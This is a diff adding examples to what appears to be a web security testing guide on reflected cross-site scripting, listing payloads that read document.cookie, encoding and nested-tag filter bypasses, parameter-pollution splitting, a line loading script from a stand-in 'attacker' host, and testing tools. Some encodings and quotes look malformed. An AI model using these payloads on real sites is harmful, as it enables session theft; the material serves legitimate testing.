@@ -210,4 +210,24 @@ Examples :
 1. check GET parameters - `http://...../index.php?user=<script>alert(document.cookie)</script>`
 2. check GET parameters - `http://...../index.php?user=<script>window.onload=function(){alert(document.cookie)}</script>`
 3. The user can use input value to fill an attribute - `<input type="text" value="INPUT_FROM_USER">` and then the tester submit `“ onfocus=”alert(document.cookie)`
+4. Different syntax or encoding - Insert unexpected variations in the syntax or encoding
+  - `"><script>.........</script>`
+  - `%3cscript%e alert(document.cookie) %3c/script%3e`
+5. Bypassing non recursive filtering - Often input sanitization is _applied only once_ 
+  - `<scr<script>ipt> alert(document.cookie) </script>`
+6. Including external script - Assume that there is a regular expression checking if "<script*" (_anything but >_) is inserted. eg `<script src="http://....../xss.js"></script>` - bypass this by using the ">" character in an attribute between _script_ and _src_
+  - `http://example/?var=<SCRIPT%20a=”>”%20SRC=”http://attacker/xss.js”></SCRIPT>`
+7. HTTP Parameter Pollution - Splitting the attack vector between multiple parameters that have the same name
+  - regular attack - `http://example/page.php?param=<script>...</script>`
+  - using HPP - `http://example/page.php?param=<script&param=>...</&param=script>`
+
+### Tools
+- OWASP CAL9000
+- PHP Charset encoder
+- HackVector
+- XSS_Proxy
+- Ratproxy
+- Burp
+- OWASP Zed Attack Proxy
+- OWASP Xenotic XSS Expoloit Framework
 
